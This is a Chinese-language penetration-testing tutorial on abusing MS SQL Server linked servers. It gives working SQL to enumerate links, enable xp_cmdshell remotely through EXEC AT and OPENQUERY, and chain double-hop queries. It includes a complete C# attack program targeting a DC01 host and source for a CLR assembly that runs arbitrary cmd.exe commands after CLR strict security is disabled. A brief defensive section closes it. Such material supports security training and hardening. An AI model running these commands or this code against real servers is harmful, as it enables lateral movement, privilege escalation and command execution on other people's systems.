# MS SQL 链接服务器攻击

## 写在前面

链接服务器是 SQL Server 的强大功能，允许跨服务器查询。但配置不当会导致严重的安全问题，攻击者可以利用它进行横向移动和权限提升。

---

## 一、链接服务器基础

### 1.1 什么是链接服务器？

```
链接服务器 (Linked Server):
├── 允许 SQL Server 连接其他数据源
├── 可以是其他 SQL Server、Oracle、MySQL 等
├── 支持分布式查询
├── 使用 OLE DB 提供程序
└── 可能配置了高权限账户
```

### 1.2 安全上下文

```
链接服务器认证方式:
├── 当前安全上下文 (动态)
│   └── 使用当前用户的凭证
├── 特定 SQL 登录 (静态)
│   └── 使用预配置的账户
│   └── 可能是 sysadmin！
└── 匿名访问
    └── 不推荐
```

### 1.3 攻击场景

```
攻击场景:
┌─────────────────────────────────────────────────────────────┐
│  攻击者 → SQL Server A (低权限)                              │
│              ↓                                              │
│         链接服务器 (配置了 sa 账户)                           │
│              ↓                                              │
│         SQL Server B (sysadmin 权限!)                        │
└─────────────────────────────────────────────────────────────┘
```

## 二、枚举链接服务器

### 2.1 使用 sp_linkedservers

```sql
-- 列出所有链接服务器
EXEC sp_linkedservers;

-- 输出示例:
-- SRV_NAME          SRV_PROVIDERNAME  SRV_PRODUCT
-- APPSRV01\SQLEXPRESS  SQLNCLI          SQL Server
-- DC01                 SQLNCLI          SQL Server
```

### 2.2 查询 sys.servers

```sql
-- 详细信息
SELECT * FROM sys.servers;

-- 只看链接服务器
SELECT name, is_linked, is_remote_login_enabled
FROM sys.servers
WHERE is_linked = 1;
```

### 2.3 查看链接配置

```sql
-- 查看链接登录配置
SELECT * FROM sys.linked_logins;

-- 查看远程登录
SELECT * FROM sys.remote_logins;
```

### 2.4 C# 实现

```csharp
// 枚举链接服务器
String execCmd = "EXEC sp_linkedservers;";
SqlCommand command = new SqlCommand(execCmd, con);
SqlDataReader reader = command.ExecuteReader();

while (reader.Read())
{
    Console.WriteLine("[*] 链接服务器: " + reader[0]);
}
reader.Close();
```

## 三、在链接服务器上执行查询

### 3.1 使用 OPENQUERY

```sql
-- 基本语法
SELECT * FROM OPENQUERY("LinkedServer", 'SELECT query');

-- 获取版本
SELECT version FROM OPENQUERY("DC01", 'SELECT @@version AS version');

-- 获取当前用户
SELECT * FROM OPENQUERY("DC01", 'SELECT SYSTEM_USER');

-- 检查权限
SELECT * FROM OPENQUERY("DC01", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
```

### 3.2 使用 EXEC AT

```sql
-- 在链接服务器上执行
EXEC ('SELECT @@version') AT DC01;

-- 执行存储过程
EXEC ('EXEC sp_configure') AT DC01;

-- 执行命令 (如果有权限)
EXEC ('EXEC xp_cmdshell ''whoami''') AT DC01;
```

### 3.3 C# 实现

```csharp
// 在链接服务器上查询
String query = "SELECT version FROM OPENQUERY(\"DC01\", 'SELECT @@version AS version');";
SqlCommand command = new SqlCommand(query, con);
SqlDataReader reader = command.ExecuteReader();
reader.Read();
Console.WriteLine("[*] 链接服务器版本: " + reader[0]);
reader.Close();
```

## 四、链接服务器权限提升

### 4.1 检查链接服务器权限

```sql
-- 检查在链接服务器上的权限
SELECT * FROM OPENQUERY("DC01", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');

-- 如果返回 1，表示有 sysadmin 权限！
```

### 4.2 启用 xp_cmdshell

```sql
-- 在链接服务器上启用 xp_cmdshell
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT DC01;
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT DC01;
```

### 4.3 执行命令

```sql
-- 在链接服务器上执行命令
EXEC ('xp_cmdshell ''whoami''') AT DC01;

-- 或使用 OPENQUERY
SELECT * FROM OPENQUERY("DC01", 'EXEC xp_cmdshell ''whoami''');
```

## 五、双跳攻击 (Double Hop)

### 5.1 什么是双跳？

```
双跳攻击:
┌─────────────────────────────────────────────────────────────┐
│  攻击者 → Server A → Server B → Server C                    │
│                                                             │
│  如果 Server B 链接到 Server C                               │
│  可以通过 Server A 访问 Server C                             │
└─────────────────────────────────────────────────────────────┘
```

### 5.2 嵌套 OPENQUERY

```sql
-- 双跳查询
SELECT * FROM OPENQUERY("ServerA",
    'SELECT * FROM OPENQUERY("ServerB", ''SELECT @@servername'')');

-- 三跳查询
SELECT * FROM OPENQUERY("ServerA",
    'SELECT * FROM OPENQUERY("ServerB",
        ''SELECT * FROM OPENQUERY("ServerC", ''''SELECT @@servername'''')'')');
```

### 5.3 注意事项

```
嵌套查询注意:
├── 引号需要正确转义
├── 每层嵌套引号数量翻倍
├── 单引号: ' → '' → '''' → ''''''''
└── 可能有深度限制
```

## 六、RPC Out 配置

### 6.1 什么是 RPC Out？

```
RPC Out:
├── 允许在链接服务器上执行存储过程
├── 默认可能禁用
├── 需要启用才能使用 EXEC AT
└── 可以通过 sp_serveroption 配置
```

### 6.2 启用 RPC Out

```sql
-- 检查 RPC Out 状态
SELECT name, is_rpc_out_enabled FROM sys.servers;

-- 启用 RPC Out (需要 sysadmin)
EXEC sp_serveroption 'DC01', 'rpc out', 'true';
```

### 6.3 使用 EXEC AT

```sql
-- 启用 RPC Out 后可以使用 EXEC AT
EXEC ('xp_cmdshell ''whoami''') AT DC01;
```

## 七、完整攻击流程

### 7.1 攻击步骤

```
步骤 1: 枚举链接服务器
┌─────────────────────────────────────────────────────────────┐
│  EXEC sp_linkedservers;                                     │
│  发现: DC01 是链接服务器                                     │
└─────────────────────────────────────────────────────────────┘
         ↓
步骤 2: 检查权限
┌─────────────────────────────────────────────────────────────┐
│  SELECT * FROM OPENQUERY("DC01",                            │
│      'SELECT IS_SRVROLEMEMBER(''sysadmin'')');              │
│  返回 1 = 有 sysadmin 权限!                                  │
└─────────────────────────────────────────────────────────────┘
         ↓
步骤 3: 启用 xp_cmdshell
┌─────────────────────────────────────────────────────────────┐
│  EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;')     │
│      AT DC01;                                               │
└─────────────────────────────────────────────────────────────┘
         ↓
步骤 4: 执行命令
┌─────────────────────────────────────────────────────────────┐
│  EXEC ('xp_cmdshell ''whoami''') AT DC01;                   │
│  获得 SQL 服务账户权限的命令执行                             │
└─────────────────────────────────────────────────────────────┘
```

### 7.2 C# 完整代码

```csharp
using System;
using System.Data.SqlClient;

namespace LinkedServerAttack
{
    class Program
    {
        static void Main(string[] args)
        {
            // 连接到第一个 SQL Server
            String sqlServer = "appsrv01.corp1.com";
            String database = "master";
            String conString = "Server = " + sqlServer +
                             "; Database = " + database +
                             "; Integrated Security = True;";

            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("[+] 连接成功!");
            }
            catch
            {
                Console.WriteLine("[-] 连接失败");
                Environment.Exit(0);
            }

            // 1. 枚举链接服务器
            Console.WriteLine("\n[*] 枚举链接服务器...");
            ExecuteQuery(con, "EXEC sp_linkedservers;", true);

            // 2. 检查链接服务器权限
            Console.WriteLine("\n[*] 检查链接服务器权限...");
            String checkPriv = "SELECT * FROM OPENQUERY(\"DC01\", " +
                              "'SELECT IS_SRVROLEMEMBER(''sysadmin'')');";
            ExecuteQuery(con, checkPriv, false);

            // 3. 启用 xp_cmdshell
            Console.WriteLine("\n[*] 启用 xp_cmdshell...");
            String enableCmd = "EXEC ('sp_configure ''show advanced options'', 1; " +
                              "RECONFIGURE; sp_configure ''xp_cmdshell'', 1; " +
                              "RECONFIGURE;') AT DC01;";
            ExecuteNonQuery(con, enableCmd);

            // 4. 执行命令
            Console.WriteLine("\n[*] 执行命令...");
            String execCmd = "EXEC ('xp_cmdshell ''whoami''') AT DC01;";
            ExecuteQuery(con, execCmd, false);

            con.Close();
        }

        static void ExecuteQuery(SqlConnection con, String query, bool multi)
        {
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();

            if (multi)
            {
                while (reader.Read())
                {
                    Console.WriteLine("    " + reader[0]);
                }
            }
            else
            {
                reader.Read();
                Console.WriteLine("    结果: " + reader[0]);
            }
            reader.Close();
        }

        static void ExecuteNonQuery(SqlConnection con, String query)
        {
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
            Console.WriteLine("    完成");
        }
    }
}
```

## 八、自定义程序集攻击

### 8.1 创建自定义程序集

```csharp
// cmdExec.dll
using System;
using Microsoft.SqlServer.Server;
using System.Data.SqlTypes;
using System.Diagnostics;

public class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void cmdExec(SqlString execCommand)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand);
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();

        SqlDataRecord record = new SqlDataRecord(
            new SqlMetaData("output", System.Data.SqlDbType.NVarChar, 4000));
        SqlContext.Pipe.SendResultsStart(record);
        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
        SqlContext.Pipe.SendResultsRow(record);
        SqlContext.Pipe.SendResultsEnd();

        proc.WaitForExit();
        proc.Close();
    }
}
```

### 8.2 启用 CLR

```sql
-- 启用 CLR
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE;

-- 禁用严格安全 (SQL 2017+)
EXEC sp_configure 'clr strict security', 0;
RECONFIGURE;
```

### 8.3 导入程序集

```sql
-- 从文件导入
CREATE ASSEMBLY myAssembly
FROM 'C:\tools\cmdExec.dll'
WITH PERMISSION_SET = UNSAFE;

-- 从十六进制字符串导入 (无需写入磁盘)
CREATE ASSEMBLY myAssembly
FROM 0x4D5A90000300000004000000FFFF...
WITH PERMISSION_SET = UNSAFE;
```

### 8.4 创建存储过程

```sql
-- 创建存储过程
CREATE PROCEDURE [dbo].[cmdExec]
    @execCommand NVARCHAR(4000)
AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];

-- 执行
EXEC cmdExec 'whoami';
```

### 8.5 清理

```sql
-- 删除存储过程
DROP PROCEDURE cmdExec;

-- 删除程序集
DROP ASSEMBLY myAssembly;
```

## 九、防御措施

### 9.1 链接服务器安全

```sql
-- 使用最小权限账户
-- 不要使用 sa 或 sysadmin 账户

-- 禁用不需要的链接服务器
EXEC sp_dropserver 'LinkedServerName', 'droplogins';

-- 限制 RPC Out
EXEC sp_serveroption 'LinkedServer', 'rpc out', 'false';
```

### 9.2 CLR 安全

```sql
-- 禁用 CLR
EXEC sp_configure 'clr enabled', 0;
RECONFIGURE;

-- 启用严格安全
EXEC sp_configure 'clr strict security', 1;
RECONFIGURE;
```

### 9.3 监控

```
监控点:
├── 链接服务器查询
├── OPENQUERY 使用
├── EXEC AT 调用
├── CLR 程序集创建
├── 跨服务器认证
└── 异常权限使用
```

## 十一、总结

### 关键要点

✅ 链接服务器可能配置了高权限账户
✅ OPENQUERY 和 EXEC AT 用于跨服务器查询
✅ 双跳攻击可以访问更多服务器
✅ 自定义程序集提供灵活的代码执行
✅ 正确配置可以防止这些攻击

### 攻击链

```
枚举链接服务器
      ↓
检查链接权限
      ↓
发现 sysadmin 权限
      ↓
启用 xp_cmdshell
      ↓
执行命令
      ↓
横向移动到更多服务器
```
